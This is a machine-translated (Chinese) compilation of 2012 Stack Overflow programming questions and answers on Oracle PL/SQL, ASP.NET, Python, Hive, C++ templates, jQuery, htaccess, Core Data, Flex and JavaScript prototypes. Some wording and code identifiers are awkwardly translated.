> ID：10446433
> 
> 赞同：0
> 
> 时间：2012-05-04T09:44:31.063
> 
> 标签：sql, oracle, stored-procedures

`Employees`我正在尝试使用以下过程将值插入表中。我收到错误。谁能向我解释这个问题？错误代码：第 29 行：忽略 SQL 语句。

```
CREATE OR REPLACE PROCEDURE insert_employee(
    p_emp_id IN NUMBER, 
    p_emp_fname IN VARCHAR2,
    p_emp_sname IN VARCHAR2,
    p_emp_add1 IN VARCHAR2, 
    p_emp_add2 IN VARCHAR2,
    p_emp_town IN VARCHAR2, 
    p_emp_county IN VARCHAR2,
    p_emp_telno IN NUMBER,
    p_emp_position IN VARCHAR2, 
    p_emp_manager IN VARCHAR2

) IS 
    v_county_id County.county_id%type;
    v_position_id Positions.position_id%type;
    v_manager_id Facilities.facilty_id%type;
BEGIN    

    SELECT county_id
    INTO v_county_id
    FROM County WHERE county_name = p_emp_county;

    SELECT position_id
    INTO v_position_id
    FROM Positions WHERE position_name = p_emp_position;

    SELECT facility_manager
    INTO v_manager_id
    FROM Facilities WHERE facility_name = p_emp_manager; 

    INSERT INTO Employees (emp_id, emp_fname, emp_sname, emp_add1, emp_add2, emp_town, emp_county, emp_telno, emp_position, emp_salary, emp_manager) 
    VALUES(p_emp_id, p_emp_fname, p_emp_sname, p_emp_add1, p_emp_add2, p_emp_town, v_county_id, p_emp_telno, v_position_id, p_emp_salary, v_manager_id);
END;
/ 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T09:57:27.873

删除 SELECT - 它们的语法无效，无论如何都不要在这里做任何必要的事情。还删除无意义的错误“处理程序”，它只是隐藏错误：

```
CREATE OR REPLACE PROCEDURE insert_employee(
    p_emp_id IN NUMBER, 
    p_emp_fname IN VARCHAR2,
    p_emp_sname IN VARCHAR2,
    p_emp_add1 IN VARCHAR2, 
    p_emp_add2 IN VARCHAR2,
    p_emp_town IN VARCHAR2, 
    p_emp_county IN VARCHAR2,
    p_emp_telno IN NUMBER,
    p_emp_position IN VARCHAR2, 
    p_emp_manager IN VARCHAR2

) IS
BEGIN    

    INSERT INTO Employees (emp_id, emp_fname, emp_sname, emp_add1, emp_add2, emp_town, emp_county, emp_telno, emp_salary, emp_position, emp_manager) 
    VALUES(p_emp_id, p_emp_fname, p_emp_sname, p_emp_add1, p_emp_add2, p_emp_town, p_emp_county, p_emp_telno, p_emp_salary, p_emp_position, p_emp_manager);

 END; 
```

如果您的示例过于简单，并且您实际上需要之前选择的值（例如，您也将这些值插入到员工中），那么您需要使用“select into”语法，例如

```
...
) IS
    v_county_id county.county_id%type;
    v_xxx county.xxx%type;
BEGIN    

    SELECT county_id
    INTO   v_county_id
    FROM County WHERE county_name = p_emp_county;
    ... 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-04T12:15:20.667

您的局部变量声明应在每行末尾有分号：

```
) IS 
    v_county_id County.county_id%type;
    v_position_id Positions.position_id%type;
    v_manager_id Facilities.facilty_id%type; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-04T09:46:33.200

您需要选择光标还是变量？

例如

```
SELECT county_id into v_country
    FROM County WHERE county_name = p_emp_county; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-04T15:11:02.990

你应该输入；在变量定义之后而不是逗号。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-10-24T17:58:48.080

```
create or replace procedure procOne(sid  OUT  number,sname OUT varchar,fee OUT number)
as
begin
insert into student values(sid,sname,fee);
end; 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-06-03T10:29:00.490

检查列名

v_manager_id 设施。**设施**_id%type；

FROM 设施 WHERE**设施**_name = p_emp_manager;

# javascript - 如何将 Ajax 选项卡控件内部的文本框读入 javascript 函数

> ID：10446435
> 
> 赞同：1
> 
> 时间：2012-05-04T09:44:38.907
> 
> 标签：javascript, asp.net, ajax

如何阅读`Textbox`里面的内容`Ajax tab container`。这是我的设计

```
<ajax:TabContainer ID="TabContainer1" runat="server" CssClass="fancy fancy-green">
        <ajax:TabPanel ID="tbpnluser" runat="server">
            <HeaderTemplate>
                New User
            </HeaderTemplate>
            <ContentTemplate>
                <asp:Panel ID="UserReg" runat="server">
                    <table align="center">
                        <tr>
                            <td>
                            </td>
                            <td align="right">
                            </td>
                            <td align="center">
                                <b>Registration Form</b>
                            </td>
                        </tr>
                        <tr>
                            <td>
                            </td>
                            <td align="right">
                                UserName:
                            </td>
                            <td>
                                <asp:TextBox ID="txtuser" runat="server"></asp:TextBox>
                            </td>
                        </tr>
                    </table>
                </asp:Panel>
            </ContentTemplate>
        </ajax:TabPanel>

<script type="text/javascript">
    function alert() {
        var value = document.getElementById("TabContainer1_tbpnluser_txtuser").value;
        alert(value);
    }
</script> 
```

这就是我的文本框的样子

```
 <asp:TextBox ID="txtuser" onblur="alert();" runat="server"></asp:TextBox> 
```

我想阅读`textbox`来自`javascript`任何人都可以帮助我

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T09:52:10.727

利用

```
var value = document.getElementById('<%=TextBoxID.ClientID%>').value; 
```

阅读有关[使用 JavaScript 获取文本框值的更多信息](http://www.dotneter.com/get-textbox-value-using-javascript)

更新如果它不工作尝试这样的

```
document.getElementById("TabContainer1_tbpnluser_txtuser").value; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-04T09:55:06.383

尝试这个：

```
var value = $('#<%=txtuser.ClientID%>').value;
alert(value); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-05-17T06:14:09.470

如果它的工作，你可以尝试而不是这个

```
var value =$find("txtuser");
alert(value) 
```

# python - 脚本的相对 Python 路径

> ID：10446440
> 
> 赞同：2
> 
> 时间：2012-05-04T09:45:00.373
> 
> 标签：python, relative-path

Python 项目如下所示：

```
安装程序.py
自述文件
应用
    脚本
        你好.py
    shell_scripts
        日期.sh

```

从`hello.py`我正在执行命令`subprocess.call(['../shell_scripts/date.sh'])`并收到错误消息`OSError: [Errno 8] Exec format error`。

注意：`date.sh`是一个完全有效的 shell 脚本并且是可执行的。我也试过`os.path.realpath`无济于事。

我认为这是由于路径无效？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T09:52:09.637

当脚本中没有设置 shell 时会出现 Exec 格式错误。尝试`#!/bin/sh`在脚本开头添加并执行 python 脚本。

# java - 访问本地磁盘上的外部 jar 的最佳方法

> ID：10446444
> 
> 赞同：0
> 
> 时间：2012-05-04T09:45:14.307
> 
> 标签：java, hadoop, user-defined-functions, hive, hdfs

我是 java 新手，所以这可能是一个幼稚的问题，我有一个外部 jar 文件，我想以编程方式移动到 Hadoop 文件系统，我有 API 可以这样做，但我只需要提供 jar 文件的路径。我不想使用硬编码路径（绝对和相对），也许如果我可以将它与我的项目一起包含，或者可能是更好的东西，以便相同的代码在不同的机器上工作，相同的 jar 文件可能不会出现在不同机器上的相同位置，如果我将提供硬编码路径，那么我需要将文件显式复制到相同位置。

* * *

我已经为 Hive 编写了 UDF（jar 文件），它在我的磁盘上可用，现在要访问 Hive 中的 UDF，需要将 jar 添加到 HIVE 类路径，所以我想将 JAR 文件从本地系统复制到 HDFS，然后将 jar 添加到来自 HDFS 路径的 HIVE 类路径。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T09:51:34.913

您可以将两个 jar 文件放在同一个目录中，路径如下所示

```
 String path = System.getProperty("user.dir") + File.separator + "name.jar"; 
```

其中**System.getProperty("user.dir")** 将返回用户的当前工作目录（从其中运行第一个 jar 文件），而**File.separator**是系统相关的默认名称分隔符。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T00:29:33.683

要在 Hive 上使用 UDF，您必须将包含 jar 的 UDF 添加到分布式缓存中，以便 Hive 集群中的所有节点都可以使用它。您可以使用如下语法来执行此操作：

```
add jar /path_to_jar/my_jar.jar 
```

'/path_to_jar/' 是本地计算机上运行此命令的 jar 的路径。如果需要，可以在将 jar 添加到分布式缓存后，仅通过其名称从您的 MapReduce 或 Hive 代码中访问该 jar。

# c++ - 将模板类作为模板的模板类不会编译

> ID：10446449
> 
> 赞同：0
> 
> 时间：2012-05-04T09:45:17.657
> 
> 标签：c++, templates

我正在尝试创建一个将地图作为模板参数的类。特别是它应该能够采用 std::map 和 boost::ptr_map。目前我正在尝试这个：

```
template <template<typename, typename> class MAP, typename KEYTYPE, typename DATATYPE>
class RestrictedMapBase
{
   /* bunch of methods ... */
} 
```

这个类被另外两个类继承，一个用于std::map，一个用于boost::ptr_map。

```
template <typename KEYTYPE, typename DATATYPE>
class RestrictedMap: public RestrictedMapBase<std::map, KEYTYPE, DATATYPE>
{
   /* Bunch of methods ... */
};

template <typename KEYTYPE, typename DATATYPE>
class RestrictedPointerMap: public RestrictedMapBase<boost::ptr_map, KEYTYPE, DATATYPE>
{
   /* Bunch of methods ... */
}; 
```

但是在编译时我得到了这些错误：

> RestrictedMap.h(166)：错误 C3201：类模板“std::map”的模板参数列表与模板参数“MAP”的模板参数列表不匹配 RestrictedMap.h(183)：参见对类模板实例化的引用STLUtils::RestrictedMap' 正在编译
> 
> RestrictedMap.h(186)：错误 C3201：类模板“boost::ptr_map”的模板参数列表与模板参数“MAP”的模板参数列表不匹配 RestrictedMap.h(203)：参见对类模板实例化的引用STLUtils::RestrictedPointerMap' 正在编译

谁能指出我做错了什么的正确方向？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T09:47:06.600

std::map 需要一个模板参数来定义它的映射。见下文：

```
template <typename KEYTYPE, typename DATATYPE>
class RestrictedMap: public RestrictedMapBase<std::map<KEYTYPE, DATATYPE>, KEYTYPE, DATATYPE>
{
   /* Bunch of methods ... */
}; 
```

然后你的基类模板参数`KEYTYPE`就`DATATYPE`变得多余了。您可以用 std::map 类中提供的 typedef 替换它们：

```
std::map<_Kty, _Ty>::key_type; // This is the same as KEYTYPE
std::map<_Kty, _Ty>::mapped_type; // This is the same as DATATYPE 
```

我会像这样重写你的类（我没有测试过）：

```
template <typename Map>
class RestrictedMap
{
public: // Typedefs
    typedef typename Map::key_type KeyType;
    typedef typename Map::mapped_type MapType;

public: // Methods
    // TODO: Write your methods here.
    void Add(const KeyType &key, const MapType &map);

private: // Members
    Map m_map;
}; 
```

然后你可以像这样选择你的地图（再次未经测试）：

```
typedef RestrictedMap<std::map<int, int>> StlMap; // TODO: Change your map's key and data type
typedef RestrictedMap<boost::ptr_map<int, int>> BoostMap; // TODO: Change your map's key and data type 
```

此处提供完整示例 - [http://ideone.com/U3AkV](http://ideone.com/U3AkV)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T10:10:48.803

类模板`std::map`有 4 个参数：

```
template <typename _Key, typename _Tp, typename _Compare = std::less<_Key>,
          typename _Alloc = std::allocator<std::pair<const _Key, _Tp> > >
class map 
```

因此，它不能通过`template<typename, typename>`，就像您不能将指向 3 参数函数的指针分配给指向 2 参数函数的指针一样。

解决方案是将要使用的确切类型传递给`RestrictedMapBase`：

```
template <typename MAP>
class RestrictedMapBase
{
   typedef typename MAP::key_type KEYTYPE;
   typedef typename MAP::mapped_type DATATYPE;
}; 
```

您的初始设计还限制了您的类的用户，因为他们无法为键指定比较函数（如果他们想使用哈希表，则为哈希函数）和分配器。

# ios - GameCenter 沙盒和 beta 测试

> ID：10446457
> 
> 赞同：1
> 
> 时间：2012-05-04T09:45:57.190
> 
> 标签：ios, xcode, sandbox, game-center

我想知道它是如何工作的：如果我现在让我的游戏与 GameCenter 一起工作并且想要发布用于测试的应用程序（AdHoc），那么将登录到 GameCenter 的每个人的帐户将变为“沙盒”状态？

你知道我不想麻烦我的测试人员，如果它是我想的那样，我也许应该禁用 GC 进行 beta 测试？

请告诉我，它是如何工作的，我该怎么做。我看到我用于自己测试的 3 个帐户变成了“沙盒”。如何修复它并恢复正常状态？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-06T18:25:26.767

我的 beta 测试人员有沙盒帐户。要将其恢复到正常模式，您只需从游戏中心应用程序中退出，然后在 App Store 游戏中登录。

# python - 具有多个变量的列表理解

> ID：10446458
> 
> 赞同：4
> 
> 时间：2012-05-04T09:46:02.947
> 
> 标签：python

有没有办法让列表理解中的两个或多个项目出列。

即我想做这样的事情：

```
>>> q = [1, 2, 3, 4]
>>> r = [x+y for x, y in q]
** This does not work though :( ** 
```

预期的：

```
>>> r
[3, 7] 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-04T09:50:48.257

您可以使用[itertools](http://docs.python.org/library/itertools.html)文档中的grouper[配方：](http://docs.python.org/library/itertools.html#recipes)

```
>>> from itertools import izip_longest
>>> [x + y for x, y in grouper(2,q)]
[3, 7] 
```

配方的源代码是这样的：

```
def grouper(n, iterable, fillvalue=None):
    "grouper(3, 'ABCDEFG', 'x') --> ABC DEF Gxx"
    args = [iter(iterable)] * n
    return izip_longest(fillvalue=fillvalue, *args) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T09:47:26.597

如果列表仅包含 2 个组，例如，则有效。不会工作，`[1,2,3,4,5]`但会工作`[1,2,3,4,5,6]`

```
>>> q = [1, 2, 3, 4]
>>> [x+y for x, y in zip(*[iter(q)]*2)]
[3, 7] 
```

也正如@gnibbler 所建议的那样

```
>>> map(sum, zip(*[iter(q)]*2)) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-04T09:54:05.250

另一种解决方案

```
>>> [sum(q[i:i+2]) for i in range(0,len(q),2)]
[3, 7]
>>> q=[1,2,3,4,5]
>>> [sum(q[i:i+2]) for i in range(0,len(q),2)]
[3, 7, 5] 
```

# javascript - 在这种情况下如何改善大表格的显示？

> ID：10446461
> 
> 赞同：2
> 
> 时间：2012-05-04T09:46:10.043
> 
> 标签：javascript, dom

我做了一个很大的表格，里面有很多元素。我使用 javascript(jquery) 使这个表单具有一步一步的效果。问题是，当页面加载时，在触发 javascript 行为之前，表单显示一团糟，并且显示了它的所有元素。有什么改进的想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T09:49:35.413

这种行为的一个常见术语是“flash of unstyled content”（这在搜索解决方案时很有用）。从技术上讲，您的内容*已设置*样式（假设页面的结构和解析正确），但您的 JavaScript 正在应用额外的样式规则，并且在页面加载之前它不会这样做。

我经常使用的一种技术是将元素设置为`display:none`直到我准备好使用它们。这并不总是实用的，因为有时元素必须是可见的和/或有一个显示框才能使特定的代码工作。

见[这篇文章](http://www.learningjquery.com/2008/10/1-way-to-avoid-the-flash-of-unstyled-content)的想法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T09:52:15.610

将所有表单元素组合在一个隐藏的 div 中（样式为 display:none）并显示“正在加载”消息。

当文档完成加载后，使用触发某种“启动”功能

```
$(document).ready(function() {
  //unhide the form here
}) 
```

# php - htaccess 带有条件的重定向规则

> ID：10446463
> 
> 赞同：1
> 
> 时间：2012-05-04T09:46:16.923
> 
> 标签：php, html, .htaccess

我在我的 htaccess 中使用了以下代码

```
<IfModule mod_rewrite.c>
   RewriteEngine on
   RewriteCond %{REQUEST_FILENAME} !-f
   RewriteCond %{REQUEST_FILENAME} !-d
   RewriteRule . index.php
 </IfModule> 
```

它重定向，好像 url 是 test.com/test --> 它重定向到 test 文件夹（这里的文件夹以 'test' 的名称可用）如果 url 是 test.com/testpage --> 它重定向到索引.php（即没有一个文件夹在testpage的名称下）

但我想将其重定向为

如果 url 是 test.com --> 它将重定向到 index.php

如果 url 是 test.com/test --> 它将重定向到相应的文件夹（如果文件夹名称存在）

如果 url 是 test.com/testpage 那么它会重定向到 page.php

我还想将某些特定名称重定向到 test.php（test.com/test2 或 test.com/test3）

请帮助这个

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T10:05:24.833

您可以为特定页面/网址单独编写他们的重写条件，或者只是添加某种后缀，例如页面传递“[category]/testpage”或任何东西，并描述重写条件，以便可以重定向。

RewriteRule ^category/(.*)$ page.php [R=301]

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T09:51:12.853

这是通过创建一个路由器类来完成的。

您在那里的代码将所有 url 重定向到 index.php 使 index 能够读取 url 并以此为基础。

见[http://www.phpaddiction.com/tags/axis/url-routing-with-php-part-one/](http://www.phpaddiction.com/tags/axial/url-routing-with-php-part-one/)

路由器教程

# apache - 301链接的其他方式是什么。在 symfony 中是否有任何插件可以做到这一点..？

> ID：10446472
> 
> 赞同：2
> 
> 时间：2012-05-04T09:47:01.593
> 
> 标签：apache, .htaccess, symfony1, http-status-code-301, response.redirect

我正在使用 symfony 1.0.6，我需要 301 多个链接（52 个链接）。我知道的唯一方法是使用 .htaccess 重定向。

有没有可以做这个工作的插件？

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T20:47:00.100

我只使用过 symfony 1.4 但也许它也适用于 symfony 1.0.x：

也许您可以修改您的路由设置并创建一个带有动作“executeRedirect301”的模块，该模块以 301 为标题 - 并将您想要的所有动作路由到此路由。

您还可以将默认路由设置为“executeRedirect301”操作，并且只创建/保留您想要留下的那些路由。

# iphone - iOS / Core Data - 如何更改 NSFetchedResultsController 的 sectionNameKeyPath？

> ID：10446477
> 
> 赞同：6
> 
> 时间：2012-05-04T09:47:14.560
> 
> 标签：iphone, ios, ipad, core-data, nsfetchedresultscontroller

我像这样声明了我的 fetchedResultsController

```
NSFetchedResultsController *fetchController = [[NSFetchedResultsController alloc] 
initWithFetchRequest:fetchRequest managedObjectContext:managedObjectContext 
sectionNameKeyPath:@"date" cacheName:nil]; 
```

但是当我单击 UISegmentedControl 时，我想将 sectionNameKeyPath 更改为 @"title"。

你知道这样做的方法吗？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-04T10:12:44.110

您需要重新定义 FRC 并重新启动获取请求。在类上设置一个属性以保存当前 sectionNameKeyPath 的值（在 viewDidLoad 事件中设置默认值），或者您可以将其传递给实例化和执行 FRC 的方法。

# javascript - 这些 jQuery JavaScript 中哪一个会具有更好的性能？

> ID：10446480
> 
> 赞同：2
> 
> 时间：2012-05-04T09:47:45.910
> 
> 标签：javascript, jquery

我有带有标题的部分。单击标题会折叠并展开其下方的部分。一个类也被应用或删除到标题以进行样式设置。其中有 9 个部分和标题。

```
$('.header').click(function() {
        $(this).toggleClass('open');
        $(this).next().slideToggle();
}); 
```

我试图提高移动设备的性能。我不是指页面加载时间，而是在动画触发之前触摸标题后动画的平滑度和延迟。

我读过使用 ID 比使用类更快。下面的速度会快多少？（注意，它需要重复 9 次，并且我显示了前 2 次）。我还假设使用 ID 比使用 .next() 遍历 DOM 更快，这会有多大不同？

```
$('#header1').click(function() {
        $(this).toggleClass('open');
        $('#section1').slideToggle();
});

$('#header2').click(function() {
        $(this).toggleClass('open');
        $('#section2').slideToggle();
}); 
```

注意，我知道它有点像拐杖，但我想使用 jQuery 而不是纯 JavaScript。无论如何，jQuery 库都会被加载，因为它在网站的其他地方使用。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T09:49:28.440

根本没关系。虽然 ID 查找确实是最快的，但现代浏览器已经优化了基于选择器的查找，因此它们都非常快，除非您执行需要遍历整个文档的操作（例如`[someattribute]`选择器）。

但是，`$('.header')`可以避免重复代码，因此是要走的路。除此之外，它更具可读性——在第二个示例中，如果不查看 DOM，您甚至不知道它影响的元素在哪里。

因此，与其尝试[优化不需要优化的内容，不如](http://c2.com/cgi/wiki?PrematureOptimization)保持代码的清洁和可维护性！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T09:50:20.047

第二种方法会*稍微*快一点，但是代码的丑陋和不可维护性会抵消掉轻微的收益。

使用第一个选项。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-04T09:52:03.227

**从技术上讲**：
ID 引用方法在不支持的浏览器中是一种更快的 DOM 查找`getElementByClassName`。但这被必须解析两倍的代码量并应用两个点击处理程序所抵消。.live() 可能更快，因为它只绑定到主体并稍后进行查找。

**实际上**：
非常微不足道的差异。这是微观优化领域。您的代码中可能有比这更大的速度因素。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-04T09:49:38.700

id 作为选择器更快，但是为了可维护性，您真的想要重复的代码吗？

# group-by - sql GROUP BY 但使用最近的记录？

> ID：10446484
> 
> 赞同：1
> 
> 时间：2012-05-04T09:48:06.253
> 
> 标签：group-by, sql-order-by

我正在尝试做这样的事情，我不确定是否可以使用简单的 GROUP BY：

```
SELECT GD.GradebookDetailId, G.SubjectCode, G.Description, G.UnitsAcademic, G.UnitsNonAcademic, 
GD.Grade, GD.Remarks, G.FacultyName, STR_TO_DATE(G.DateApproved, '%m/%d/%Y %h:%i:%s') AS 'DateAproved'

FROM gradebookdetail GD 
INNER JOIN gradebook G ON GD.GradebookId=G.GradebookId 
WHERE G.DateApproved IS NOT NULL AND G.GradebookType='final' AND StudentIdNumber='2012-12345'

GROUP BY ???????
ORDER BY G.SubjectCode ASC 
```

所以当我有一张这样的桌子时：

学生：2012-12345

```
SubjectCode | Grade | DateApproved
SUBJ123 | 2.00 | 1/4/2012
SUBJ123 | 1.75 | 1/5/2012
SUBJ987 | 1.50 | 1/5/2012 
```

它应该如下所示：

学生：2012-12345

```
SubjectCode | Grade | DateApproved
SUBJ123 | 1.75 | 1/5/2012
SUBJ987 | 1.50 | 1/5/2012 
```

编辑：这是解决方案：

```
SELECT 
    GD.GradebookDetailId, 
    G.SubjectCode, 
    G.Description, 
    G.UnitsAcademic, 
    G.UnitsNonAcademic, 
    GD.Grade, 
    GD.Remarks, 
    G.FacultyName, 
    STR_TO_DATE(G.DateApproved, '%m/%d/%Y %h:%i:%s') AS 'DateAproved'
FROM 
    gradebookdetail GD INNER JOIN 
    gradebook G ON GD.GradebookId=G.GradebookId 
WHERE 
    G.DateApproved IS NOT NULL AND 
    G.GradebookType='final' AND 
    StudentIdNumber='2011-10172' AND 
    NOT EXISTS (
        SELECT 1 FROM gradebook G2 INNER JOIN gradebookdetail GD2 ON G2.GradebookId=GD2.GradebookId
        WHERE 
            G2.GradebookType = 'final' AND 
            G2.DateApproved IS NOT NULL AND 
            GD2.StudentIdNumber = GD.StudentIdNumber AND 
            G2.SubjectCode = G.SubjectCode AND
            G2.DateApproved > G.DateApproved
    )
ORDER BY G.SubjectCode ASC 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-05T04:46:17.443

我认为这个查询会做你想要的，但我还没有测试过。所以让我知道它是否有问题。

```
SELECT 
    GD.GradebookDetailId, 
    G.SubjectCode, 
    G.Description, 
    G.UnitsAcademic, 
    G.UnitsNonAcademic, 
    GD.Grade, 
    GD.Remarks, 
    G.FacultyName, 
    STR_TO_DATE(G.DateApproved, '%m/%d/%Y %h:%i:%s') AS 'DateAproved'
FROM 
    gradebookdetail GD INNER JOIN 
    gradebook G ON GD.GradebookId=G.GradebookId 
WHERE 
    G.DateApproved IS NOT NULL AND 
    G.GradebookType='final' AND 
    StudentIdNumber='2012-12345' AND 
    NOT EXISTS (
        SELECT 1 FROM gradebook G2 
        WHERE 
            G2.GradebookType = 'final' AND 
            G2.DateApproved IS NOT NULL AND 
            G2.StudentIdNumber = G.StudentIdNumber AND 
            G2.StudentCode = G.SubjectCode AND
            G2.DateApproved > G.DateApproved
    )
ORDER BY G.SubjectCode ASC 
```

# apache-flex - 浏览器窗口最小化时的数据绑定问题

> ID：10446487
> 
> 赞同：1
> 
> 时间：2012-05-04T09:48:24.837
> 
> 标签：apache-flex, data-binding

嗨，我遇到了数据绑定属性的问题。我有一个按钮，其启用属性绑定到一个布尔变量

```
<mx:Button id="btnSave" width="98" label="Sauvegarder" enabled="{isEditing}" click="sendEvent(UPDATE)"/> 
```

当我单击数据网格时，将调度一个事件

```
var eventL : ListEvent = new ListEvent(ListEvent.ITEM_CLICK,true);
                eventL.rowIndex = listData.rowIndex;
                dispatchEvent(eventL); 
```

然后我有一个监听器，我在其中更改绑定属性的值

```
private function onItemClick(event : ListEvent) : void {
     var encoder : Encoder = Encoder(theView.dg.dataProvider[event.rowIndex]);
     theView.isEditing = true;
    } 
```

当我最小化浏览器的窗口或使用 windows+tab 放置另一个窗口时，数据绑定值会更改，并且我的按钮会被禁用..

ps-我使用的是纯 mvc 并且 isEditing 值更改发生在调解器中

任何想法？

谢谢

# html - 在 Silverlight RichTextBox 中加载 HTML 内容？

> ID：10446491
> 
> 赞同：2
> 
> 时间：2012-05-04T09:48:33.007
> 
> 标签：html, c#-4.0, richtextbox, asp.net-4.0, silverlight-5.0

看，我有一个 html 文件，我正在尝试加载 iframe 和 Web 浏览器控件以外的其他控件，所以我使用了 RichTextBox，它是否仅支持 XAML？如果它也支持 HTML。我该如何实现。

我试图加载一个 html 文件，但它加载为文本。

下面是我的代码。

```
<Grid x:Name="LayoutRoot" Background="White">
    <Grid.ColumnDefinitions>
        <ColumnDefinition Width="400"/>
        <ColumnDefinition Width="580"/>
    </Grid.ColumnDefinitions>
    <Grid.RowDefinitions>
        <RowDefinition/>
    </Grid.RowDefinitions>
    <Canvas>
    <TextBox Height="23" x:Name="txtFileName" Canvas.Left="15" Canvas.Top="40" Grid.Row="0" Grid.Column="0" Width="280"  />
        <Button Content="Browse" Height="23" HorizontalAlignment="Left" x:Name="btnBrowse" Canvas.Left="300" Canvas.Top="40" Grid.Row="0" Grid.Column="0" Width="75" Click="BtnBrowse_Click"  />

        <RichTextBox x:Name="rtxtboxHTML" Margin="3" Grid.Row="0" Grid.Column="1" Width="450" Height="400" HorizontalAlignment="Center" VerticalAlignment="Center" Canvas.Left="450" Canvas.Top="40" IsReadOnly="True" TextWrapping="Wrap"/>

    </Canvas>
</Grid>

private void BtnBrowse_Click(object sender, RoutedEventArgs e)
    {

        OpenFileDialog openFileDialog = new OpenFileDialog();
        openFileDialog.Filter = "Html files (*.html)|*.htm|All Files (*.*)|*.*";

        if (openFileDialog.ShowDialog()==true)
        {
            txtFileName.Text = openFileDialog.File.Name;
            FileInfo _File = openFileDialog.File;

            using (StreamReader strReader = new StreamReader(openFileDialog.File.OpenRead()))
            {
                string _strTemp = string.Empty;
                //var rs = Application.GetResourceStream(new Uri(openFileDialog.File.Name, UriKind.Relative));
                //StreamReader sr = new StreamReader(rs.Stream);
                while (!strReader.EndOfStream)
                {
                    _strTemp = strReader.ReadToEnd();
                }
                strReader.Close();
                rtxtboxHTML.Selection.Text = _strTemp;
            }
        }
    } 
```

我哪里出错了...谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T20:03:06.610

`RichTextBox`不会为您解析 HTML。

# c++ - 不完整的类型错误

> ID：10446494
> 
> 赞同：4
> 
> 时间：2012-05-04T09:48:55.197
> 
> 标签：c++, friend, forward-declaration

我试图让 A 班成为 B 班的朋友。

```
class B;

class A{
public:
void show(const B&); // ##1## but this one works fine  
B ob;// error incomplete type

};

class B{
public:
int b;
B():b(1){}
friend class A;  

}; 
```

所以我的问题为什么它是不完整的类型？我认为当我这样做时，`class B`它就像一个函数的原型，它告诉编译器在代码的某处有一个定义。

同样在##1##上面的代码中，为什么这是可能的？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-04T09:49:55.860

不，这是一个前向声明，并没有定义完整的类型。如果要将成员保留为对象而不是指针，则需要对`B`before进行完整定义。`A`

原因之一是`B`必须知道类的大小`A`，因为`A`的大小取决于`B`.

我建议你`#include "B.h"`在`A.h`.

编辑：澄清：

```
struct A;

struct B
{
   A foo();
   void foo(A);
   void foo(A&);
   void foo(A*);

   A* _a;
   A& __a;
   A a;  // <--- only error here
}; 
```

# javascript - javascript 对象原型属性访问

> ID：10446496
> 
> 赞同：0
> 
> 时间：2012-05-04T09:48:56.503
> 
> 标签：javascript, prototype

这是我的问题的 jsFiddle：http: [//jsfiddle.net/4wyvv/1/](http://jsfiddle.net/4wyvv/1/)

基本上：

```
//constructor function
function Maker(){
    var str;

    this.init = function(str){
        this.str = str;
    };

    this.msg = function(){
        return this.str;
    };
}

//object from Maker
var obj = new Maker();

obj.init("Hi my name is Dan");

//make sure everything exists and has worked as expected
Audit.Log(obj.msg());
//look in Maker.prototype for the constructor property
Audit.Log(obj.constructor);
//look in Maker.prototype for the constructor property
Audit.Log(Maker.prototype.constructor);

//now look for all makers prototype properties, this should list atleast "constructor"
for(var i in Maker.prototype){
    Audit.Log(i);
} 
```

为什么 foreach 循环没有输出任何东西？正如我所展示的那样，它至少应该推出构造函数`Maker.prototype.constructor`。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T10:22:05.280

来自[MDN](https://developer.mozilla.org/en/JavaScript/Reference/Statements/for...in)

> **for..in**以任意顺序迭代对象的可枚举属性。对于每个不同的属性，可以执行语句。

`constructor`, `toString`,之类的东西`hasOwnProperty`是不可枚举的属性，它们不会在 for..in 中列出

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-04T10:22:13.783

对象的某些属性（例如“构造函数”）是隐藏的，或者更准确地说是不可枚举的，因此它们不会像这样使用 for in 循环枚举，在 ECMA5 中，我们有一个可以获取所有属性的方法

```
Object.getOwnPropertyNames(Maker.prototype) 
```

这是给你的

```
["constructor"] 
```

这里有一个详细的解释：[如何在Javascript中显示一个对象的所有方法？](https://stackoverflow.com/questions/2257993/how-to-display-all-methods-in-a-javascript-object/2258232)

# javascript - 在页面加载时使用 javascript 设置段落文本

> ID：10446499
> 
> 赞同：28
> 
> 时间：2012-05-04T09:49:01.497
> 
> 标签：javascript, jquery, html, mobile

基本上我想做的就是在页面加载时使用 JavaScript/jQuery 设置段落的文本。这是一个简单的 Kendo UI 应用程序。

谁能给我一个这样做的方法？

